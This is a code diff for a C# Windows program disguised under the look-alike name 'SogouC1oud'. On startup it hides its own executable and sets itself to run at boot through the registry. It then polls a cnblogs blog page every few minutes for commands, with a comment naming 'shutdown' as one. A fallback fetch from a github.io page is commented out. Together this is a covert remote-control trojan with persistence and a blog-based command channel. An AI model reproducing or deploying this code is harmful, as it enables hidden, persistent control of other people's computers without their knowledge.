@@ -24,11 +24,16 @@ namespace SogouC1oud
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            //文件路径
             string fileUrl = Application.StartupPath + @"\SogouC1oud.exe";
+            //隐藏文件
             HiddenFile(fileUrl);
+            //修改注册表开机启动
             SetAutoRun(fileUrl, true);
+            //扫描间隔
             TickScanning(5);
         }
+
         #region 定时扫描
         /// <summary>
         /// 
@@ -37,8 +42,8 @@ namespace SogouC1oud
         public void TickScanning(int nimute)
         {
             //命令格式 “关机”
-            int wait = 10000;// * 60 * nimute; //五分钟执行一次
-            string url = "http://www.cnblogs.com/oiliu/";//配置自己的博客园地址
+            int wait = 1000 * 60 * nimute;                 //五分钟执行一次
+            string url = "http://www.cnblogs.com/oiliu/";  //配置自己的博客园地址
             //string timereg = @"\d{4}-\d{2}-\d{2} \d{2}:\d{2}";//匹配时间的正则
             while (true)
             {
@@ -99,8 +104,8 @@ namespace SogouC1oud
             }
             catch (Exception)
             {
-                Byte[] pageData = wc.DownloadData("http://oiliu.github.io/s.htm"); // 从资源下载数据并返回字节数组。
-                shtml = enc.GetString(pageData);
+                //Byte[] pageData = wc.DownloadData("http://oiliu.github.io/s.htm"); // 从资源下载数据并返回字节数组。
+                //shtml = enc.GetString(pageData);
             }
             return shtml;
         }
